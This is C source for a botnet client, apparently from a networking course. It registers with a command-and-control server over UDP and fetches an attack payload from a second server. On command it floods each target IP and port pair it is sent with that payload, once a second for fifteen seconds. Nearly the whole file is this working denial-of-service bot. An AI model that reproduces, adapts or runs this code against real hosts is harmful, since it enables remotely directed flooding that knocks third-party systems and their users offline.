#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include "util.h"
#include "debug.h"

struct addr_pair
{
    char ip[INET_ADDRSTRLEN];
    char port[22];
};

struct MSG
{
    char command;
    struct addr_pair pairs[20];
};

void usage()
{
    fprintf(stderr, "Usage:  ./bot server_ip server_port");
}

void job(char *addr, char *port);

// status 0 ok
// status 1 bad usage...
// status 2 getUDP_addrinfo failed
// status 3 socket creation failed
// status 4 sendTo  failed
// status 5 recvFrom failed
int main(int argc, char **argv)
{
    if (argc != 3)
    {
        usage();
        return 1;
    }

    debug_printf("Arguments recieved: %s %s\n", argv[1], argv[2]);
    job(argv[1], argv[2]);

    return 0;
}

void job(char *addr, char *port)
{
    debug_printf("Send entry\n");

    struct addrinfo *res, *pamti;
    getUDP_addrinfo(addr, port, &res, 2, "getAddrInfo failed for provided addr and port\n", true);
    pamti = res;

    ///////////////////////////////////////
    ///// sendTo
    //////////////////////////////////////

    int sock = Socket(res->ai_family, res->ai_socktype, res->ai_protocol, 3,
                      "Could not complete socket creation\n");
    debug_printf("Created socket\n");

    char *msg = "REG\n";
    int size = strlen(msg);
    Sendto(sock, msg, size, 0, res->ai_addr, res->ai_addrlen, 4,
           "partial/failed write to C&C \n");

    debug_printf("Sent %s\n", msg);

    char UDP_servMSG[513];
    int msgInit = 0;
    while (1)
    {
        char buf[sizeof(struct MSG)];
        int nread = Recvfrom(sock, buf, sizeof(buf), 0, res->ai_addr, &res->ai_addrlen, 5,
                             "partial/failed read from C&C\n");
        debug_printf("Recieved %d bytes from C&C\n%s\n", nread, buf);

        struct MSG *command = (struct MSG *)buf;
        int numPairs = (nread - sizeof(char)) / sizeof(struct addr_pair);
        debug_printf("Recieved %d pairs from C&C\n", numPairs);
        debug_printf("Recieved command %c from C&C\n", command->command);
        for (int i = 0; i < numPairs; i++)
            debug_printf("Recieved IP: %s  PORT: %s  from C&C\n", command->pairs[i].ip,
                         command->pairs[i].port);

        if (command->command == '1')
        {
            if (!msgInit)
            {
                debug_printf("Payload not initialized!\n");
                continue;
                //UDP_servMSG[0] = '\n';
                //UDP_servMSG[1] = '\0';
            }

            for (int numSec = 0; numSec < 15; numSec++)
            {
                debug_printf("Sending sec=%d\n", numSec);

                for (int i = 0; i < numPairs; i++)
                {
                    struct addrinfo *res;
                    getUDP_addrinfo(command->pairs[i].ip, command->pairs[i].port, &res, 2,
                                    "getAddrInfo failed for given pair\n", false);

                    int payloadSize = strlen(UDP_servMSG) - 8; // odrezi PAYLOAD:
                    Sendto(sock, UDP_servMSG + 8, payloadSize, 0, res->ai_addr, res->ai_addrlen, 4,
                           "Failed to send payload to given pair\n");

                    freeaddrinfo(res);
                }
                sleep(1);
            }

            // close(runSock);
        }
        else
        {
            if (!numPairs)
            {
                debug_printf("Recieved command PROG and 0 adresses!\n");
                continue;
            }

            debug_printf("Sending HELLO\n");
            struct addrinfo *res;
            getUDP_addrinfo(command->pairs->ip, command->pairs->port, &res, 2,
                            "failed getAddrInfo UDP_server\n", true);

            char *hello = "HELLO";
            int helloSize = strlen(hello);
            Sendto(sock, hello, helloSize, 0, res->ai_addr, res->ai_addrlen, 4,
                   "partial/failed write to UDP_server\n");

            int n = Recvfrom(sock, UDP_servMSG, 512, MSG_WAITALL, res->ai_addr, &res->ai_addrlen, 5, "partial/failed read from UDP_server\n");
            UDP_servMSG[n] = '\0';
            msgInit = 1;

            debug_printf("Recieved from UDP_serv: %s", UDP_servMSG);

            freeaddrinfo(res);
        }
    }

    freeaddrinfo(pamti); // oslobodi alocirani prostor
    close(sock);
}
